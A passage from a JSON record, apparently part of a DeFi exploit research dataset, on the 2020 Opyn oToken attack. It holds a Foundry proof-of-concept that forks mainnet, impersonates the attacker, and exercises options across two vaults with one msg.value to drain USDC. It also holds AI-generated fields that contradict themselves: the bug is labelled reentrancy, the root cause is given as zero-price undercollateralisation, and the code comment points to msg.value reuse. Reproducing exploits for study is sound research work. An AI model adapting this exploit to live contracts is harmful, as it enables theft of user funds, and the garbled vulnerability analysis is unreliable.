. The `exercise` function calculates the amount of underlying to pay based on the number of oTokens and the `underlyingRequiredToExercise` function. Crucially, the `exercise` function in `OptionsContract` calculates the collateral to pay based on the number of oTokens exercised and the `transactionFee`. The attacker exercises a large number of oTokens across multiple vaults, draining the protocol's USDC reserves. || 4. Attacker calls `removeUnderlying` to withdraw the underlying assets (USDC) that were obtained through the exercise of options, realizing the profit. || 5. The attacker's USDC balance increases significantly, demonstrating the profit from the exploit.", "ai_confidence_has_source_code": true, "ai_confidence_known_pattern_match": true, "ai_confidence_reasoning": "1 verified, 0 proxy", "ai_confidence_score": 0.75, "ai_confidence_verified_contracts": true, "ai_explanation": "The attacker exploits the Opyn protocol by first calling `addERC20CollateralOption` to mint oTokens with insufficient collateral. This function allows the attacker to deposit a small amount of collateral (9.9e9 USDC) and mint a large number of oTokens (300e6). The vulnerability lies in the fact that the `isSafe` function, which checks for sufficient collateralization, uses `getPrice` which can return 0 if the asset is not ETH and no exchange is found. This allows the attacker to mint oTokens without adequate backing. After minting, the attacker calls `exercise` with a small `msg.value` (30 Ether) to exercise put options on multiple vaults. The `exercise` function in `OptionsContract` calculates the underlying assets to be paid based on the `oTokensToExercise` and the `underlyingRequiredToExercise` function. Crucially, if the underlying asset is ETH, the `exercise` function checks if `msg.value` equals the calculated underlying amount. However, the `addERC20CollateralOption` function in `oToken` calls `addERC20Collateral` which in turn calls `_addCollateral` in `OptionsContract`. This function only adds to the `collateral` balance and does not mint any underlying assets. The `exercise` function then attempts to transfer the underlying assets to the exerciser. If the underlying is ETH, it checks `msg.value`. If the underlying is an ERC20 token, it uses `underlying.transferFrom`. The exploit leverages the fact that the `exercise` function in `OptionsContract` calculates the collateral to pay based on the number of oTokens exercised and the `transactionFee`. The attacker exercises a large number of oTokens (600e6) across multiple vaults, effectively draining the protocol's USDC reserves by receiving underlying assets (USDC in this case, as the collateral is USDC) that were not properly backed by collateral. Finally, `removeUnderlying` is called to withdraw the underlying assets, realizing the profit.", "ai_mitigation": [], "ai_root_cause": "The `addERC20CollateralOption` function in the `oToken` contract allows minting oTokens without proper collateral checks. The `isSafe` function, which is responsible for ensuring sufficient collateral, relies on `getPrice` which can return 0 for non-ETH assets if no Uniswap exchange is found. This allows the creation of oTokens that are not fully backed by collateral. The `exercise` function then allows the attacker to redeem these undercollateralized oTokens for the underlying asset (USDC in this case), draining the protocol's reserves.", "ai_vulnerability_type": "Reentrancy", "attack_title": "Opyn_exp", "contracts": [{"abi_available": true, "address": "0x951d51baefb72319d9fbe941e1615938d89abfe2", "artifact_dir": "data/contracts/2020_08_opyn/contracts/01_vulnerable_951d51ba_otoken", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.5.10+commit.5a6ea5b1", "contract_name": "oToken", "explorer_url": "https://etherscan.io/address/0x951d51baefb72319d9fbe941e1615938d89abfe2", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:25:53.641Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2020_08_opyn/contracts/01_vulnerable_951d51ba_otoken/source.sol"], "source_hint": "AI extracted: The Opyn protocol's `addERC20CollateralOption` function allows minting new oTokens without sufficient collateralization, leading to an imbalance that can be exploited.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2020_08_opyn", "id": "2020_08_opyn", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:26:01.397Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
@Analysis 
https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8

@Transaction
0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a*/

contract ContractTest is Test {
    IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);

    address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
    }

    function test_attack() public {
        cheats.startPrank(attacker);

        uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
        console.log("Attacker USDC balance before is    ", balBefore);
        console.log("------EXPLOIT-----");

        //Adds ERC20 collateral, and mints new oTokens in one step
        uint256 amtToCreate = 300_000_000;
        uint256 amtCollateral = 9_900_000_000;
        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

        //create an arry of vaults
        address payable[] memory _arr = new address payable[](2);
        _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);
        _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

        //The attacker excercises the put option on two different valuts using the same msg.value
        opyn.exercise{value: 30 ether}(600_000_000, _arr);

        //remove share of underlying after excercise
        opyn.removeUnderlying();

        uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
        console.log("Attacker USDC balance after is     ", balAfter);
        console.log("Attacker profit is                  ", balAfter - balBefore);
    }
}
